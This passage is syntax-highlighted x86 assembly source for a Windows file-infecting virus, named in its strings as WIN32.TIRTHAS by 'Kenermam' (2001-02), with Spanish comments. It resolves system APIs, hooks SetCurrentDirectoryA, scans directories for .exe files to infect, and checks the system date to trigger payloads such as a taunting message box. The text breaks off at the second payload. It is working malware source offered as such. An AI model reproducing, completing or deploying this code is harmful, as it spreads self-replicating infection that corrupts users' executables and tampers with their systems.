      </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Fuction_list_2</span><span class="sc4">]</span><span class="sc0">
      </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Get_Address_1</span><span class="sc0">

      </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">File_USER32</span><span class="sc4">]</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
      </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">A_LoadLibraryA</span><span class="sc4">]</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Base_kernel</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">5h</span><span class="sc0">
      </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Address_list_3</span><span class="sc4">]</span><span class="sc0">
      </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Fuction_list_3</span><span class="sc4">]</span><span class="sc0">
      </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Get_Address_1</span><span class="sc0">

      </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">File_GDI32</span><span class="sc4">]</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
      </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">A_LoadLibraryA</span><span class="sc4">]</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Base_kernel</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
      </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Address_list_4</span><span class="sc4">]</span><span class="sc0">
      </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Fuction_list_4</span><span class="sc4">]</span><span class="sc0">              
      </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Get_Address_1</span><span class="sc0">

      </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">Check_date</span><span class="sc0">

      </span><span class="sc1">;----------------------------------------------------------------------</span><span class="sc0">
      </span><span class="sc1">; Calculo de las RVA's de las nuevas funciones</span><span class="sc0">
      </span><span class="sc1">;----------------------------------------------------------------------</span><span class="sc0">
      </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc1">; Salida:</span><span class="sc0">
      </span><span class="sc1">;   EAX = RVA de la nueva funcion.</span><span class="sc0">
      </span><span class="sc1">;----------------------------------------------------------------------</span><span class="sc0">

 </span><span class="sc5">calc_RVA</span><span class="sc4">:</span><span class="sc0">

      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Virtual_address</span><span class="sc4">]</span><span class="sc0">
      </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">SetCurrentDirectoryA_size</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Datos_0</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">            </span><span class="sc1">;RVA de SetCurrentDirectoryA</span><span class="sc0">
     
      </span><span class="sc6">ret</span><span class="sc0">

      </span><span class="sc5">Datos_0</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

      </span><span class="sc1">;----------------------------------------------------------------------</span><span class="sc0">
      </span><span class="sc1">;Obtencion de direcciones.</span><span class="sc0">
      </span><span class="sc1">;----------------------------------------------------------------------</span><span class="sc0">
      </span><span class="sc1">; Entrada:</span><span class="sc0">
      </span><span class="sc1">;  ECX = Numero de direcciones a obtener.</span><span class="sc0">
      </span><span class="sc1">;  EDI = Puntero a la tabla de direcciones.</span><span class="sc0">
      </span><span class="sc1">;  ESI = Puntero a la tabla de nombres.</span><span class="sc0">
      </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc1">; Salida:</span><span class="sc0">
      </span><span class="sc1">;  Direcciones de las funciones de la tabla de nombres.</span><span class="sc0">
      </span><span class="sc1">;----------------------------------------------------------------------</span><span class="sc0">

 </span><span class="sc5">Get_Address_1</span><span class="sc4">:</span><span class="sc0">

      </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
      </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">Get_Address</span><span class="sc0">

 </span><span class="sc5">Get_Apis</span><span class="sc4">:</span><span class="sc0">

      </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc2">0h</span><span class="sc0">
      </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">Incremento</span><span class="sc0">
      </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
      </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">Get_Apis</span><span class="sc0">

 </span><span class="sc5">Incremento</span><span class="sc4">:</span><span class="sc0">

      </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">

 </span><span class="sc5">Get_Address</span><span class="sc4">:</span><span class="sc0">

      </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Base_kernel</span><span class="sc4">]</span><span class="sc0">
      </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">A_GetProcAddress</span><span class="sc4">]</span><span class="sc0">
      </span><span class="sc6">stosd</span><span class="sc0">
      </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
      </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

      </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">Quit_find_apis</span><span class="sc0">

      </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
     
      </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">Get_Apis</span><span class="sc0">

 </span><span class="sc5">Quit_find_apis</span><span class="sc4">:</span><span class="sc0">
      </span><span class="sc6">ret</span><span class="sc0">

      </span><span class="sc1">;----------------------------------------------------------------------</span><span class="sc0">
      </span><span class="sc1">; FUNCION FindFirstFileA</span><span class="sc0">
      </span><span class="sc1">;----------------------------------------------------------------------</span><span class="sc0">
      </span><span class="sc1">; 0 = Kernel32.dl_</span><span class="sc0">
      </span><span class="sc1">; 1 = winsystem.ker</span><span class="sc0">
      </span><span class="sc1">;----------------------------------------------------------------------</span><span class="sc0">

 </span><span class="sc5">Fuction_Find_first_file</span><span class="sc4">:</span><span class="sc0">

      </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Info_file</span><span class="sc4">]</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

      </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Flag_fuction_Find_File</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">Is_wininit</span><span class="sc0">

      </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Kernel32backup</span><span class="sc4">]</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
      </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">Call_find_file</span><span class="sc0">

 </span><span class="sc5">Is_wininit</span><span class="sc4">:</span><span class="sc0">

      </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">File_System_addr</span><span class="sc4">]</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

 </span><span class="sc5">Call_find_file</span><span class="sc4">:</span><span class="sc0">

      </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">A_FindFirstFileA</span><span class="sc4">]</span><span class="sc0">
      </span><span class="sc6">ret</span><span class="sc0">
      </span><span class="sc1">;----------------------------------------------------------------------</span><span class="sc0">
      </span><span class="sc1">; GUARDAR REGISTROS</span><span class="sc0">
      </span><span class="sc1">;----------------------------------------------------------------------</span><span class="sc0">

 </span><span class="sc5">Save_register</span><span class="sc4">:</span><span class="sc0">

      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">EAX_seg</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">EBX_seg</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">  
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ECX_seg</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">  
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">EDX_seg</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc0"> 
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ESI_seg</span><span class="sc4">],</span><span class="sc8">esi</span><span class="sc0">  
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">EDI_seg</span><span class="sc4">],</span><span class="sc8">edi</span><span class="sc0">  

      </span><span class="sc6">ret</span><span class="sc0">

      </span><span class="sc1">;----------------------------------------------------------------------</span><span class="sc0">
      </span><span class="sc1">; RESTAURAR REGISTROS</span><span class="sc0">
      </span><span class="sc1">;----------------------------------------------------------------------</span><span class="sc0">

 </span><span class="sc5">Old_register</span><span class="sc4">:</span><span class="sc0">

      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">EAX_seg</span><span class="sc4">]</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">EBX_seg</span><span class="sc4">]</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ECX_seg</span><span class="sc4">]</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">EDX_seg</span><span class="sc4">]</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ESI_seg</span><span class="sc4">]</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">EDI_seg</span><span class="sc4">]</span><span class="sc0">

      </span><span class="sc6">ret</span><span class="sc0">

      </span><span class="sc1">;//////////////////////////////////////////////////////////////////////</span><span class="sc0">
      </span><span class="sc1">;/////////////////////// Control del KERNEL ///////////////////////////</span><span class="sc0">
      </span><span class="sc1">;//////////////////////////////////////////////////////////////////////</span><span class="sc0">

      </span><span class="sc1">;----------------------------------------------------------------------</span><span class="sc0">
      </span><span class="sc1">;----------------------------------------------------------------------</span><span class="sc0">
      </span><span class="sc1">; Funcion: SetCurrentDirectoryA</span><span class="sc0">
      </span><span class="sc1">;----------------------------------------------------------------------</span><span class="sc0">
      </span><span class="sc1">;----------------------------------------------------------------------</span><span class="sc0">

 </span><span class="sc5">SetCurrentDirectoryA</span><span class="sc4">:</span><span class="sc0">

      </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
      </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Delta_in_kernel_1</span><span class="sc0">

 </span><span class="sc5">Delta_in_kernel_1</span><span class="sc4">:</span><span class="sc0">

      </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
      </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Delta_in_kernel_1</span><span class="sc0">

      </span><span class="sc1">;----------------------------------------------------------------------</span><span class="sc0">
      </span><span class="sc1">; GUARDAR REGISTROS</span><span class="sc0">
      </span><span class="sc1">;----------------------------------------------------------------------</span><span class="sc0">

      </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Save_register</span><span class="sc0">

      </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">EBP_seg</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

      </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Return_address</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

      </span><span class="sc1">;----------------------------------------------------------------------</span><span class="sc0">
      </span><span class="sc1">; MARCA DE RESIDENCIA</span><span class="sc0">
      </span><span class="sc1">;----------------------------------------------------------------------</span><span class="sc0">

      </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Old_register</span><span class="sc0">

      </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">7BFh</span><span class="sc0">
      </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">Search_file_in_directory</span><span class="sc0">

      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">7C7h</span><span class="sc0">

      </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Save_register</span><span class="sc0">

      </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">Pass_control</span><span class="sc0">

      </span><span class="sc1">;----------------------------------------------------------------------</span><span class="sc0">
      </span><span class="sc1">; ACCIONES</span><span class="sc0">
      </span><span class="sc1">;----------------------------------------------------------------------</span><span class="sc0">

 </span><span class="sc5">Search_file_in_directory</span><span class="sc4">:</span><span class="sc0">

      </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">A_SetCurrentDirectoryA</span><span class="sc4">]</span><span class="sc0">

      </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Save_register</span><span class="sc0">

      </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Info_file</span><span class="sc4">]</span><span class="sc0">
      </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Files_exe</span><span class="sc4">]</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
      </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">A_FindFirstFileA</span><span class="sc4">]</span><span class="sc0">

      </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
      </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">Pass_control</span><span class="sc0">
      </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Handle_find_files</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

      </span><span class="sc1">;----------------------------------------------------------------------</span><span class="sc0">
      </span><span class="sc1">; ABRIR EL ARCHIVO</span><span class="sc0">
      </span><span class="sc1">;----------------------------------------------------------------------</span><span class="sc0">
 
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Flag_infection_by_fuction</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">

      </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Open_file</span><span class="sc0">

      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Flag_infection_by_fuction</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">

 </span><span class="sc5">More_files</span><span class="sc4">:</span><span class="sc0">

      </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Info_file</span><span class="sc4">]</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Handle_find_files</span><span class="sc4">]</span><span class="sc0">
      </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">A_FindNextFileA</span><span class="sc4">]</span><span class="sc0">

      </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">Pass_control</span><span class="sc0">

      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Flag_infection_by_fuction</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">

      </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Open_file</span><span class="sc0">

      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Flag_infection_by_fuction</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">

      </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">More_files</span><span class="sc0">

      </span><span class="sc1">;----------------------------------------------------------------------</span><span class="sc0">
      </span><span class="sc1">; PASAR EL CONTROL</span><span class="sc0">
      </span><span class="sc1">;----------------------------------------------------------------------</span><span class="sc0">

 </span><span class="sc5">Pass_control</span><span class="sc4">:</span><span class="sc0">

      </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Old_register</span><span class="sc0">

      </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Return_address</span><span class="sc4">]</span><span class="sc0">

      </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">EBP_seg</span><span class="sc4">]</span><span class="sc0">
      </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
      </span><span class="sc6">ret</span><span class="sc0">


      </span><span class="sc1">;//////////////////////////////////////////////////////////////////////</span><span class="sc0">

      </span><span class="sc1">;----------------------------------------------------------------------</span><span class="sc0">
      </span><span class="sc1">; TESTEO DE LA FECHA DEL SISTEMA</span><span class="sc0">
      </span><span class="sc1">;----------------------------------------------------------------------</span><span class="sc0">

 </span><span class="sc5">Check_date</span><span class="sc4">:</span><span class="sc0">

      </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">date_system</span><span class="sc4">]</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
      </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">A_GetSystemTime</span><span class="sc4">]</span><span class="sc0">

      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Day</span><span class="sc4">]</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Month</span><span class="sc4">]</span><span class="sc0">

      </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">5h</span><span class="sc0">
      </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">Search_files</span><span class="sc0">

      </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">13h</span><span class="sc0">
      </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">Search_files</span><span class="sc0">

      </span><span class="sc1">;----------------------------------------------------------------------</span><span class="sc0">
      </span><span class="sc1">; PAYLOAD</span><span class="sc0">
      </span><span class="sc1">;----------------------------------------------------------------------</span><span class="sc0">
      </span><span class="sc1">; En cada infeccion hay un numero para activar uno de los tres payload</span><span class="sc0">
      </span><span class="sc1">; que tiene el virus. El primer payload consiste en mostrar un mensaje</span><span class="sc0">
      </span><span class="sc1">; con los creditos. El segundo llena el borde izquierdo de la pantalla</span><span class="sc0">
      </span><span class="sc1">; con el mensaje YOU ARE FOUL. Por ultimo, el tercero, cambia las</span><span class="sc0">
      </span><span class="sc1">; opciones de accesibilidad del sistema.</span><span class="sc0">
      </span><span class="sc1">;----------------------------------------------------------------------</span><span class="sc0">

      </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Numero_payload</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">Payload_2</span><span class="sc0">

      </span><span class="sc1">;----------------------------------------------------------------------</span><span class="sc0">
      </span><span class="sc1">; PAYLOAD 1</span><span class="sc0">
      </span><span class="sc1">;----------------------------------------------------------------------</span><span class="sc0">

      </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Title_Box_1</span><span class="sc4">]</span><span class="sc0">
      </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Message_1</span><span class="sc4">]</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">A_MessageBoxA</span><span class="sc4">]</span><span class="sc0">
      </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">Search_files</span><span class="sc0">

      </span><span class="sc5">Title_Box_1</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">" WIN32.TIRTHAS WRITTEN BY KENERMAM. (c)2001-02 SPAIN "</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc5">Message_1</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">" KENERMAM MESSAGE:"</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
                  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">" YOU ARE FOUL."</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
                  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">" THIS IS INFECTION OF TIRTHAS."</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

      </span><span class="sc1">;----------------------------------------------------------------------</span><span class="sc0">
      </span><span class="sc1">; PAYLOAD 2</span><span class="sc0">
